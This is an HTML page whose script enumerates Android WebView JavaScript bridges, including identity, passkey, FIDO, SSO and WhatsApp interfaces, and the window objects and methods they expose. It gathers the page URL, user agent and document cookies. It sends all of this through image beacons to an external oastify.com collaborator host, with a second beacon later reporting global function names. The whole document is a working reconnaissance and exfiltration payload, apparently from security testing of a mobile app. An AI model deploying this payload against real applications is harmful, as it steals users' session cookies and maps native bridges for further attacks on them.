<!DOCTYPE html>
<html>
<head><title>Enhanced JS Bridge Discovery</title></head>
<body>
<script>
// Comprehensive bridge discovery
var results = {
  url: window.location.href,
  userAgent: navigator.userAgent,
  cookies: document.cookie || 'none',
  interfaces: [],
  androidInterfaces: [],
  allWindowProps: []
};

// Check for Android-specific interfaces
var androidTests = [
  'Android', 'AndroidInterface', 'NativeInterface', 'JSISecureStorage',
  'smash', 'ReactNativeWebView', 'APPToBrowserSSOJSBridge', 
  'MAPAndroidJSBridge', 'IDENTITY_MOBILE', 'FidoAuthenticatorJSBridge',
  'IDENTITY_MOBILE_NAVIGATION', 'IDENTITY_MOBILE_PHONE_NUMBER_PICKER', 
  'IDENTITY_MOBILE_PASSKEY', 'IDENTITY_MOBILE_DIGITAL_ID', 'IDENTITY_MOBILE_WHATSAPP',
  'AndroidJavaScriptBridge', 'MAPAndroidJSBridge', 'FidoAuthenticatorJSBridge'
];

androidTests.forEach(function(name) {
  if (window[name]) {
    var methods = [];
    try {
      for (var prop in window[name]) {
        if (typeof window[name][prop] === 'function') {
          methods.push(prop);
        }
      }
    } catch(e) {}
    results.androidInterfaces.push({name: name, methods: methods});
  }
});

// Enumerate ALL window properties containing 'Interface', 'Bridge', or 'JS'
for (var prop in window) {
  if (prop.toLowerCase().includes('interface') || 
      prop.toLowerCase().includes('bridge') ||
      prop.toLowerCase().includes('js') ||
      prop.toLowerCase().includes('android') ||
      typeof window[prop] === 'object' && window[prop] !== null) {
    
    var info = {name: prop, type: typeof window[prop]};
    if (typeof window[prop] === 'object' && window[prop] !== null) {
      try {
        var methods = [];
        for (var method in window[prop]) {
          if (typeof window[prop][method] === 'function') {
            methods.push(method);
          }
        }
        info.methods = methods.slice(0, 10); // First 10 methods
      } catch(e) {
        info.error = e.toString();
      }
    }
    results.allWindowProps.push(info);
  }
}

// Check if WebView has special properties
if (window.webkit) results.webkit = 'present';
if (window.chrome) results.chrome = 'present';
if (window.external) results.external = 'present';

// Send results
var img = new Image();
img.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/comprehensive_scan?data=' + 
          encodeURIComponent(JSON.stringify(results));

// Test if we can access any global functions that might be bridges
setTimeout(function() {
  var globalFuncs = [];
  for (var prop in window) {
    if (typeof window[prop] === 'function' && prop.length > 3) {
      globalFuncs.push(prop);
    }
  }
  var img2 = new Image();
  img2.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/global_functions?data=' + 
             encodeURIComponent(JSON.stringify(globalFuncs.slice(0, 20)));
}, 1000);
</script>
</body>
</html>
